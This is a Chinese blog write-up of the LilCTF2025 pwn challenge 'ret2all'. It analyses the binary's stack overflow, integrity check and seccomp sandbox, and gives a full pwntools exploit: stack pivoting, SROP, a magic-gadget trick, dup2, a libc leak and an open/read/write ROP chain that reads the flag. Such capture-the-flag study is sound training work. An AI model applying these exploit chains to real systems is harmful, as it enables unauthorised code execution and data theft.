---
author: roxy
pubDatetime: 2026-03-31T18:42:17+08:00
title: "ret2all"
categories:
  - "pwn"
hideEditPost: true
description: "一道溢出的痕，一场检测的困，一次极致的栈，一个落寞的人"
---
题目来自`LilCTF2025`的一道pwn题，名为`ret2all`

链接：https://gz.imxbt.cn/games/30

官方WP：https://lil-house.feishu.cn/wiki/JqIEw4fTPiHcRnkSazacGBTNng6

如作者所言

一道溢出的痕，一场检测的困，一次极致的栈，一个落寞的人

落寞的人唱着孤独的题，孤独的题笑着落寞的人

人知题恐怖，题晓人心毒

一件完美的艺术品，葬下了整个栈时代

本题风格是极简，不加那些乱七八糟的东西把题目弄的又乱又看不懂，好让做题者知道，做的是pwn题，不是逆向

要让每个不懂逆向的小pwn手都能看懂题目意思，这才是纯粹的pwn

下面是题目

首先是main函数

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  return vuln();
}
```

然后是`init`

```c
int init()
{
  __int64 savedregs; // [rsp+0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+8h] [rbp+8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  RBP = (__int64)&savedregs;
  RET = (__int64)retaddr - 32;
  printf("RBP:%p\n", &savedregs);
  printf("RET:%p\n", (const void *)RET);
  puts("Keep it and...I love you");
  mprotect((void *)((unsigned __int64)&RBP & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 1);
  seccomp();
  return close(2);
}
```

设置了标准I/O(0 stdin 1 stdout 2 stderr)

随后直接打印了`RBP`的值与返回地址

使用`mprotect`将包含全局变量`RBP`的内存页(按页对齐，大小`0x1000`字节)设置为**只读**

并`close(2)`关闭错误输出(stderr)

以及`seccomp`

```c
__int64 seccomp()
{
  __int64 v1; // [rsp+38h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  seccomp_rule_add(v1, 0LL, 303LL, 0LL);
  seccomp_rule_add(v1, 0LL, 304LL, 0LL);
  seccomp_rule_add(v1, 0LL, 40LL, 0LL);
  seccomp_rule_add(v1, 0LL, 44LL, 0LL);
  seccomp_rule_add(v1, 0LL, 46LL, 0LL);
  seccomp_rule_add(v1, 0LL, 19LL, 0LL);
  seccomp_rule_add(v1, 0LL, 17LL, 0LL);
  seccomp_rule_add(v1, 0LL, 295LL, 0LL);
  seccomp_rule_add(v1, 0LL, 327LL, 0LL);
  seccomp_rule_add(v1, 0LL, 9LL, 0LL);
  seccomp_rule_add(v1, 0LL, 18LL, 0LL);
  seccomp_rule_add(v1, 0LL, 20LL, 0LL);
  seccomp_rule_add(v1, 0LL, 296LL, 0LL);
  seccomp_rule_add(v1, 0LL, 328LL, 0LL);
  seccomp_rule_add(v1, 0LL, 5LL, 0LL);
  seccomp_rule_add(v1, 0LL, 10LL, 0LL);
  seccomp_rule_add(v1, 0LL, 41LL, 0LL);
  seccomp_rule_add(v1, 0LL, 42LL, 0LL);
  seccomp_rule_add(v1, 0LL, 49LL, 0LL);
  seccomp_rule_add(v1, 0LL, 50LL, 0LL);
  seccomp_rule_add(v1, 0LL, 56LL, 0LL);
  seccomp_rule_add(v1, 0LL, 57LL, 0LL);
  seccomp_rule_add(v1, 0LL, 0LL, 1LL);
  seccomp_rule_add(v1, 0LL, 1LL, 1LL);
  return seccomp_load(v1);
}
```

![如图](/images/98.png)

ban了`execve`，`execveat`等等一堆东西

明显只能`ORW`

而又注意到read的第一个参数不能大于等于1，因此只能为0(`stdin`)

且write的第一个参数只能等于2(`stderr`)，但是后面又close(2)

所以需要`dup2(1, 2)`更改fd才能再调用write

继续看vuln函数

```c
__int64 vuln()
{
  return rread();
}
```

接下来是`rread`

```c
__int64 rread()
{
  _BYTE buf[96]; // [rsp+0h] [rbp-60h] BYREF

  read(0, buf, 0x88uLL);
  return shadow((__int64)buf);
}
```

buf的长度为96字节，而`read`读取`0x88`字节

显然存在**栈溢出**

不过要注意一下为什么return了一个`shadow`函数?

```c
__int64 __fastcall shadow(__int64 a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 3; ++i )
  {
    if ( memcmp((const void *)(24LL * i + a1), LOVE, 0x18uLL) )
      puts("You don't love me?");
  }
  if ( memcmp((const void *)(a1 + 96), &RBP, 8uLL) )
    puts("You don't keep it?");
  if ( memcmp((const void *)(a1 + 104), &RET, 8uLL) )
    puts("You don't keep it?");
  return 0LL;
}
```

原来这是一个检测

要求buf必须为四个`I love you I feel lonely`(全局变量`LOVE`)

且RBP的值与返回地址不能被修改

乍一看似乎就算没通过检测也只是打印`You don't love me?`和`You don't keep it?`

仔细一想

puts底层会调用write，而write的fd1被沙箱禁用，便会直接退出程序

也就是说前`0x70`字节确实不能动

故受控的只有后面的`0x18`字节

我们能干什么呢?

不妨调试一下

> [!TIP]
> 注意本地调试最好先暂时关闭`ASLR`

![如图](/images/99.png)

发现了什么

我们可控的最后8字节刚好可以覆盖上一个函数的`saved rbp`

有什么用呢?

干说有点抽象

继续动手调试

这次先接收白给的信息以通过检测

并列出也许有用的`gadget`

```python
p.recvuntil(b'RBP:')
RBP = int(p.recvline().strip(), 16)

p.recvuntil(b'RET:')
RET = int(p.recvline().strip(), 16)

log.success(f"RBP = {hex(RBP)}")
log.success(f"RET = {hex(RET)}")

pie_base = RET - 0x1871
magic_gadget = pie_base + 0x1252
'''
0x0000000000001252 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
'''
read1 = pie_base + 0x182f
read2 = pie_base + 0x1840
read3 = pie_base + 0x183b
leave_ret = pie_base + 0x1852
pop_rbp_ret = magic_gadget + 1
ret = pop_rbp_ret + 1

'''
.text:000000000000182F                 lea     rax, [rbp+buf]
.text:0000000000001833                 mov     edx, 88h        ; nbytes
.text:0000000000001838                 mov     rsi, rax        ; buf
.text:000000000000183B                 mov     edi, 0          ; fd
.text:0000000000001840                 call    _read
.text:0000000000001845                 lea     rax, [rbp+buf]
.text:0000000000001849                 mov     rdi, rax
.text:000000000000184C                 call    shadow
.text:0000000000001851                 nop
.text:0000000000001852                 leave
.text:0000000000001853                 retn
'''

LOVE = b"I love you I feel lonely"

payload1 = LOVE * 4
payload1 += p64(RBP)
payload1 += p64(RET)

payload1 += p64(RBP + 0x10) + p64(read1) + p64(RBP - 0x10)
```

stack

![如图](/images/100.png)

ni

看到

![如图](/images/101.png)

由于多重函数的嵌套调用

形成连续的3个`leave ret`

`rread`在`leave ret`返回后执行`vuln`的`leave ret`

我们控制`vuln`的`saved rbp`到任意地址

随后执行main的`leave ret`

此时便会从我们控制的地址开始执行

因此我们布置上面的payload，从而控制执行流再次`read`，创造利用空间

然而

shadow的检测无疑是一道坎

如果每次都要满足其检测

又谈何利用?

程序被我们控制后的执行流是这样的

```asm
.text:000000000000182F                 lea     rax, [rbp+buf]
.text:0000000000001833                 mov     edx, 88h        ; nbytes
.text:0000000000001838                 mov     rsi, rax        ; buf
.text:000000000000183B                 mov     edi, 0          ; fd
.text:0000000000001840                 call    _read
.text:0000000000001845                 lea     rax, [rbp+buf]
.text:0000000000001849                 mov     rdi, rax
.text:000000000000184C                 call    shadow
.text:0000000000001851                 nop
.text:0000000000001852                 leave
.text:0000000000001853                 retn
```

看似无法绕过shadow检测

实则不然

我们调试看看

![如图](/images/102.png)

在`call read`这里

我们`si`

![如图](/images/103.png)

发现了什么

```asm
.text:0000000000001845                 lea     rax, [rbp+buf]
```

`call read`的返回地址直接被保存在栈上

由于read其实是glibc共享库中封装好的函数以方便用户的直接调用

其内部实则是这样的

![如图](/images/104.png)

当执行`SYS_read`时才真正触发**系统调用**，阻塞并等待中断触发时唤醒读入

因此，我们完全可以在执行`SYS_read`读入时覆盖`call read`这个glibc函数的返回地址与rbp，从而绕过检测，控制执行流

那下一步的目标呢?

由于没有gadget，我们只能打`SROP`，因此思路便是寻找在栈上的libc地址，通过`partial overwrite`，覆写为`syscall`

并通过`rax`保存函数返回值的机制，通过读入15字节触发`SROP`

![如图](/images/105.png)

![如图](/images/113.png)

找到一只野生`syscall`

计算读入起始地址与偏移

布置payload

```python
payload2 = p64(0) * 7 + p64(RBP + 0xf0) + p64(read1) + p64(leave_ret)
payload2 += p64(RBP + 0x100) + p64(leave_ret) + p64(RBP - 0x18) + p64(leave_ret) + p64(0) + p8(0xec)
```

但是存在一个问题

这个`syscall`提供的`SROP`没有那么干净，也没有那么强有力

我们最想要的其实是`syscall ret`

这一步需要利用所谓的**magic-gadget**

```asm
0x0000000000001252 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
```

我们通过`SROP`设置好精确计算偏移的`rbx`和`rbp`

然后利用这个`gadget`

将`syscall`覆写为`syscall ret`

发送`payload2`后栈布局:

![如图](/images/109.png)

提前布置好栈风水

并获得`syscall`能力

随后`call read`函数返回

但是返回地址和rbp都被篡改

经过一系列`leave ret`的不断迁移

最终再次执行`read`

![如图](/images/108.png)

为了保护`syscall`不被破坏

这次先不打栈返回

正常过检测

配合`payload2`提前布置好的栈风水

```python
payload3 = LOVE * 4
payload3 += p64(RBP) + p64(RET)
payload3 += p64(RBP + 0xf0) + p64(read1)
```

得到一个干净的`read`环境

![如图](/images/110.png)

接下来便可以着手准备`SROP`了

借用一下作者提供的一张图

![如图](/images/111.png)

第一步:利用`magic-gadget`获得`syscall ret`

si

`call read`返回地址

![如图](/images/114.png)

构造`payload4`

布置`sigcontext`的同时打`栈返回`

```python
payload4 = b'A' * 8
payload4 += p64(0) # rdi
payload4 += p64(RBP + 0x30) # rsi
payload4 += p64(RBP + 0x65) # rbp
payload4 += p64(0x6edca) # rbx
payload4 += p64(0x200) # rdx
payload4 += p64(0) # rax 
payload4 += p64(0) # rcx
payload4 += p64(RBP + 0x40) # rsp
payload4 += p64(read2) # rip
payload4 += p64(0) # eflags
payload4 += p64(0x33) # cs/gs/fs
payload4 += p64(RBP + 0x150 + 1) + p64(read1) + p64(RBP + 0x20) + p64(leave_ret)
```

发送后的栈布局:

![如图](/images/115.png)

执行`leave ret`后再次read:

![如图](/images/116.png)

再次打栈返回

此时`sigcontext`已经布置好，只需要将rax设置为15随后`syscall`

注意rbp先前巧妙的设置以顺利读入15字节

`call read`返回地址:

![如图](/images/117.png)

布置`payload5`

```python
payload5 = b'A' * 7 + p64(pop_rbp_ret)
```

发送

此时栈布局:

![如图](/images/118.png)

配合先前的栈风水布局与`pop rbp ret`

读入15字节成功设置rax为15，随后`syscall`

![如图](/images/119.png)

触发`sigreturn`

![如图](/images/120.png)

成功控制所有寄存器并再次`read`

依旧布置`sigcontext`的同时打**栈返回**

```python
payload6 = p64(leave_ret)
payload6 += p64(magic_gadget)
payload6 += p64(pop_rbp_ret)
payload6 += p64(RBP + 0xa8 + 1) + p64(read1) + p64(RBP + 0x20)
payload6 += p64(leave_ret) + p64(RBP + 0xd0) + p64(read1) + p64(0) * 4
payload6 += p64(1) # rdi
payload6 += p64(2) # rsi
payload6 += p64(RBP + 0x68) # rbp
payload6 += p64(0) # rbx
payload6 += p64(0) # rdx
payload6 += p64(33) # rax 
payload6 += p64(0) # rcx
payload6 += p64(RBP + 0x28) # rsp
payload6 += p64(ret) # rip
payload6 += p64(0) # eflags
payload6 += p64(0x33) # cs/gs/fs
```

由于`rbp`和`rbx`已经被我们所控制

此时执行`magic-gadget`后

成功获得`syscall ret`

![如图](/images/121.png)

随后依旧`SROP`

```python
payload7 = b'A' * 7 + p64(pop_rbp_ret)
```

配合`payload6`的`sigcontext`成功`dup2(1, 2)`

现在获得标准输出(`stdout`)了便能轻松泄露libc基址了

同理

```python
payload8 = p64(pop_rbp_ret) + p64(RBP + 0xd8 + 1) + p64(read1) + p64(RBP + 0x20) + p64(leave_ret)
payload8 += p64(2) # rdi
payload8 += p64(RBP + 0x28) # rsi
payload8 += p64(RBP + 0xe8) # rbp
payload8 += p64(0) # rbx
payload8 += p64(0x200) # rdx
payload8 += p64(1) # rax 
payload8 += p64(0) # rcx
payload8 += p64(RBP + 0x28) # rsp
payload8 += p64(ret) # rip
payload8 += p64(0) # eflags
payload8 += p64(0x33) # cs/gs/fs
payload8 += p64(read3)

payload9 = b'A' * 7 + p64(pop_rbp_ret)
```

接收

```python
syscall = u64(p.recv(6).ljust(8, b'\0'))
libc_base = syscall - 0x98fb6
success('libc_base =>> ' + hex(libc_base))
pop_rax_ret = libc_base + 0xdd237
pop_rdi_ret = libc_base + 0x10f75b
pop_rsi_ret = libc_base + 0x110a4d
```

最后打`ORW`获得flag

```python
payload10 = b'A' * 0xc0 + b'./flag\x00\x00'
# close
payload10 += p64(pop_rax_ret) + p64(3) + p64(pop_rdi_ret) + p64(0) + p64(syscall)
# open
payload10 += p64(pop_rax_ret) + p64(2) + p64(pop_rdi_ret) + p64(RBP + 0xe8) + p64(pop_rsi_ret) + p64(0) + p64(syscall)
# read
payload10 += p64(pop_rax_ret) + p64(0) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(RBP) + p64(syscall)
# write
payload10 += p64(pop_rax_ret) + p64(1) + p64(pop_rdi_ret) + p64(2) + p64(syscall)
```

拿下

![如图](/images/122.png)

---

总结:

佩服作者的实力

> [!CAUTION]
> 本题还有个巧妙点是作者并没有刻意地去加某某知识点到题中，出题者同时也是做题者，我只是尝试加一个沙箱再加一些检测，并且没有添加额外的后门gadget，在做题的过程中下意识地运用自己知道的手段，没想到居然能串起来这么多知识点，并且用得都很顺理成章，故评价为“一件完美的艺术品，葬下了整个栈时代”

最后的最后

还是引用作者的原话:

感谢并恭喜你看完本篇文章，一路走来，你已经经历许多，这是现今栈利用的顶峰，能够完成本题，你已称得上

"Master of Stack"!!!

---

**一道溢出的痕，一场检测的困，一次极致的栈，一个落寞的人**


